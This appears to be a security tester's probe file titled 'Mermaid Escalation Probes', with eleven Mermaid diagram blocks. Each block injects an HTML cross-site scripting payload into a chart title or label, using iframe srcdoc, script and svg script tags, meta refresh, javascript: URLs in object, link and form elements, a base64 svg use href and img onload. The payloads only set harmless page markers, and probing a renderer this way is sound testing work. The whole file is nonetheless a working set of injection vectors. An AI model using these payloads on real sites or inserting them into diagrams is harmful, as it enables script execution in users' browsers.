# Mermaid Escalation Probes

## E1: xychart with iframe srcdoc
```mermaid
xychart-beta
    title "<iframe srcdoc='<script>document.body.dataset.eOne=1<\/script>' id=E1></iframe>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E2: xychart with direct script tag
```mermaid
xychart-beta
    title "<script id=E2>document.body.dataset.eTwo=1</script>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E3: xychart with svg+script tag
```mermaid
xychart-beta
    title "<svg id=E3><script>document.body.dataset.eThree=1</script></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E4: xychart with meta refresh
```mermaid
xychart-beta
    title "<meta http-equiv=refresh content='0;url=javascript:document.body.dataset.eFour=1' id=E4>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E5: xychart with style behavior
```mermaid
xychart-beta
    title "<style id=E5>body{background:url('https://canary-e5.localhost/')}</style>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E6: xychart with svg use href
```mermaid
xychart-beta
    title "<svg id=E6><use href='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+ZG9jdW1lbnQuYm9keS5kYXRhc2V0LmVTaXg9MTwvc2NyaXB0Pjwvc3ZnPg==#x'/></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E7: sankey with object data
```mermaid
sankey-beta
"<object id=E7 data='javascript:document.body.dataset.eSeven=1'></object>","B",10
A,B,5
```

## E8: c4 with link rel import
```mermaid
C4Context
    title <link id=E8 rel=import href='javascript:document.body.dataset.eEight=1'>
    Person(p, "User", "desc")
```

## E9: xychart with data uri image with onload
```mermaid
xychart-beta
    title "<img id=E9 src='data:image/svg+xml,<svg/onload=document.body.dataset.eNine=1/>'>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## E10: gantt with form action
```mermaid
gantt
    title <form id=E10 action='javascript:document.body.dataset.eTen=1'><input autofocus></form>
    section A
    t1 :a1, 2020-01-01, 30d
```

## E11: Test unique-marker image src with cache-bust  
```mermaid
xychart-beta
    title "<img id=E11_marker src=/probe-e11-unique-marker-rule>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```
